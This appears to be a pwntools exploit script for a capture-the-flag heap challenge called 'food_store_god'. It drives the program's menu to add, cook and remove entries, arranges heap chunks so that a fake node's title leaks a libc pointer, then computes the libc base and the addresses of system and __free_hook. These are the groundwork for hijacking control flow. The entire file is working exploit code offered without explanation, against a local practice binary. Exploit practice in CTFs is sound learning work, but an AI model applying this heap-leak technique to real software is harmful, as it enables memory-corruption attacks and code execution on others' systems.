import sys,os; sys.path.insert(0,'/mnt/c/Users/ha/Downloads/pwn')
os.environ['LOG']='error'
from pwn import *
DIR='/mnt/c/Users/ha/Downloads/pwn'
libc=ELF(DIR+'/libc-4e5dfd832191073e18a09728f68666b6465eeacd.so')
p=process([DIR+'/ld-2.24.so','--library-path',DIR,DIR+'/food_store_god'],env={'LD_LIBRARY_PATH':DIR})
def ru(x,**k): return p.recvuntil(x,**k)
def sl(x): p.sendline(x if isinstance(x,bytes) else str(x).encode())
ru(b'Your name: '); sl(b'AAAA')
def add(t,ings=(b'0',)):
    ru(b'Your choice: '); sl(b'1'); ru(b'Your choice: '); sl(b'1'); ru(b'Magic : '); m=p.recvline().strip()
    ru(b'Title :'); sl(t)
    for i,ing in enumerate(ings):
        ru(b'Choose ingredient :'); sl(ing); ru(b'Add more ingredient ? (1/Yes,2/No) : '); sl(b'1' if i<len(ings)-1 else b'2')
    ru(b'Your choice: '); sl(b'4'); return m
def cook(t): ru(b'Your choice: '); sl(b'5'); ru(b'What do you want to cook :'); sl(t); ru(b'Done !')
def rm(t): ru(b'Your choice: '); sl(b'1'); ru(b'Your choice: '); sl(b'2'); ru(b'Title :'); sl(t); ru(b'Your choice: '); sl(b'4')
add(b'A1'); add(b'B2'); cook(b'Beef noodles'); add(b'YY'); add(b'Z9'); cook(b'Beef noodles')
for t in (b'B2',b'Z9',b'A1',b'YY'): rm(t)
add(b'CC')
ru(b'Your choice: '); sl(b'1'); ru(b'Your choice: '); sl(b'3')
import time; time.sleep(0.3); data=p.recvrepeat(0.8)
import re
ts=re.findall(rb'Title : ([^\n]*)', data)
leakbytes=ts[-1]  # fake node title
leak=u64(leakbytes[:6].ljust(8,b'\0'))
libc_base = leak - 0x3c1c68
print("fake title bytes:", leakbytes.hex())
print("leak = %#x" % leak)
print("libc_base = %#x (page-aligned? %s)" % (libc_base, libc_base & 0xfff == 0))
print("system  = %#x" % (libc_base + libc.symbols['system']))
print("free_hook = %#x" % (libc_base + libc.symbols['__free_hook']))
print("alive =", p.poll() is None)
p.close()
